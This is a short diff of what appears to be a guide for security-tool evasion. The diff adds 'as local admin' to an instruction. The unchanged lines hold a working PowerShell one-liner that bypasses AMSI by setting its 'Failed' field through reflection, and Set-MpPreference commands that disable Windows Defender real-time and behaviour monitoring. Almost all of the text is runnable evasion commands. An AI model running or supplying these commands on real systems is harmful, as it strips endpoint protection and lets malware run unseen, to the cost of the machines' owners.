@@ -5,7 +5,7 @@ Run the below AMSI bypass command first, in a single line of code.
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
 ```
 
-After running the AMSI bypass, run the following:
+After running the AMSI bypass, run the following as local admin:
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableBehaviorMonitoring $true
